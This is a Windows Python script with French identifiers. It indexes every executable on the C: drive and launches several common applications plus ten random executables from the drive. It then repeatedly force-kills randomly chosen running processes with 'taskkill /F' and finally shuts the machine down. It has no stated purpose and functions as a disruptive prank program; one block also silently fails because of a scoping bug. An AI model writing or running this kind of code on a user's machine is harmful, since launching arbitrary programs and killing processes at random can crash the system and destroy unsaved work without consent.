#coding:utf-8
import os
from random import randrange
import time
def lancement_application(i):
	try:
		i="\""+i+"\""
		os.system(i)
	except:
		pass
def arreter_programme():
	os.system("tasklist /FO CSV > file1.txt")
	fic=open('file1.txt','r')
	contenu=fic.readlines()
	nbre=randrange(2,len(contenu))
	ligne=contenu[nbre]
	i=1
	prog=str()
	while ligne[i]!='"':
		prog=prog+ligne[i]
		i+=1
	try:
		os.system("taskkill /F /IM {}".format(prog))
	except:
		pass
try:
	exe_s=open('file.txt','r')
except:
	for i in ['C:\\']:
		os.system("dir /s /b \""+i+"\"*.exe > file.txt")
	exe_s=open('file.txt','r')
Applications_Standars=["wordpad.exe","WINWORD.EXE","chrome.exe","opera.exe","firefox.exe","vlc.exe","EXCEL.EXE"]
contenu=exe_s.read().split('\n')
for i in contenu:
	for n,j in enumerate(Applications_Standars):
		if j.upper() in i.upper():
			Applications_Standars[n]=i
for i in Applications_Standars:
	try:
		lancement_application(i)
	except:
		pass
j=0
while j<10:
	nbre_aleatoire=randrange(len(contenu))
	programme_a_executer=contenu[nbre_aleatoire]
	lancement_application(programme_a_executer)
	j+=1
	time.sleep(5)
Applications_Standars=["wordpad.exe","WINWORD.EXE","chrome.exe","opera.exe","firefox.exe","vlc.exe","EXCEL.EXE"]
for i in Applications_Standars:
	try:
		if fic.find(i)!=-1:
			os.system("taskkill /F /IM {}".format(i))
	except:
		pass
time.sleep(10)
j=0
while j<10:
	arreter_programme()
	j+=1
	time.sleep(60)
time.sleep(5000)
os.system("shutdown")
